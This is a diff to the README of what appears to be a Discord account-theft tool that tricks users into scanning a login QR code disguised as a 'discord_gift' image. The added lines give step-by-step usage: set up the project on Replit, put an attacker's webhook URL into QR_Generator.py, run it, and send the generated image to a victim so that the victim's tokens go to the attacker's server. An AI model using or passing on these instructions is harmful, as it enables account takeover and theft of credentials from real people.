@@ -6,4 +6,17 @@ into scanning their Discord login QR Code, and gain access to their account. Use
 
 ### Usage
 First Step, Import This Project From GitHub In [REPLIT](https://replit.com)
-second Step, Type These Commands In Your Replit Console
+
+second Step, Type This Commands In Your Replit Console
+```
+pip3 install -r req*
+```
+Third Step, Open QR_Generator.py
+```
+url = "put your webhook here"
+```
+Forth Step, Run The Tools In Your Console
+```
+python3 QR*
+```
+Last Step, Send discord_gift.png To Victim And His Tokens Will Send To Your Server By Webhook
